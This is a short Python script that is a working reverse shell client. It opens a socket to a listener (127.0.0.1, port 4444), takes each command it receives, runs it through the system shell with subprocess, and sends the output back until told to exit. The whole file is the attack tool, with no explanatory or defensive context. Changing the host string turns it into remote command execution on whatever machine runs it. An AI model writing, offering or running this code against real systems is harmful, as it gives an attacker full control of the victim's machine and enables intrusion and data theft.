import socket
import subprocess
import os

host = "127.0.0.1"
port = 4444

s = socket.socket()
s.connect((host, port))

while True:
    command = s.recv(1024).decode()
    if command.lower() == "exit":
        break
    try:
        output = subprocess.check_output(command, shell=True)
    except Exception as e:
        output = str(e).encode()
    s.send(output)
s.close()
